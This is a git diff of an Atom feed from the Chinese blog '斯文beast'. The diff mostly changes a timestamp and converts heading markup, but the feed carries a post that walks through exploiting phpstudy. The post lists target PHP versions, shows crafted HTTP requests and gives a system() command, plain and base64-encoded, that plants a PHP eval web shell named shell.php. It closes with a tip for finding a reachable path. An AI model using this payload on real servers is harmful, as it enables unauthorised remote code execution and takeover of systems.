@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>http://www.svenbeast.com/</id>
     <title>斯文beast</title>
-    <updated>2019-09-24T09:23:32.845Z</updated>
+    <updated>2019-09-24T09:26:48.578Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="http://www.svenbeast.com/"/>
     <link rel="self" href="http://www.svenbeast.com//atom.xml"/>
@@ -16,7 +16,7 @@
         <link href="http://www.svenbeast.com//post/2OBQlt_Ta">
         </link>
         <updated>2019-09-24T08:36:03.000Z</updated>
-        <content type="html"><![CDATA[<p>###0x01 phpstudy利用方法</p>
+        <content type="html"><![CDATA[<h3 id="0x01-phpstudy利用方法">0x01 phpstudy利用方法</h3>
 <ul>
 <li>请求任意后缀为php的文件</li>
 <li>目标环境为php5.2,5.4,且不能为nts</li>
@@ -35,8 +35,8 @@ Accept-Encoding: gzip,deflate
 Accept-Language: zh-CN,zh;q=0.9
 </code></pre>
 <figure data-type="image" tabindex="1"><img src="http://www.svenbeast.com//post-images/1569315041105.png" alt=""></figure>
-<p>###0x02 getshell 远程连接<br>
-system('echo ^&lt;?php @eval($_POST[&quot;shell&quot;])?^&gt;&gt;PHPTutorial\WWW\shell.php');<br>
+<h3 id="0x02-getshell-远程连接">0x02 getshell 远程连接</h3>
+<p>system('echo ^&lt;?php @eval($_POST[&quot;shell&quot;])?^&gt;&gt;PHPTutorial\WWW\shell.php');<br>
 ↓<br>
 c3lzdGVtKCdlY2hvIF48P3BocCBAZXZhbCgkX1BPU1RbInNoZWxsIl0pP14+PlBIUFR1dG9yaWFsXFdXV1xzaGVsbC5waHAnKTs=</p>
 <pre><code>GET /phpinfo.php HTTP/1.1
@@ -51,7 +51,7 @@ Accept-Encoding: gzip,deflate
 Accept-Language: zh-CN,zh;q=0.9
 </code></pre>
 <figure data-type="image" tabindex="2"><img src="http://www.svenbeast.com//post-images/1569316391812.png" alt=""></figure>
-<p>###0x03 可能会遇到的问题</p>
+<h3 id="0x03-可能会遇到的问题">0x03 可能会遇到的问题</h3>
 <ul>
 <li>若无法成功连接，可能生成目录不对，执行命令tree /f查看文件树，找到可访问路径生成shell</li>
 </ul>
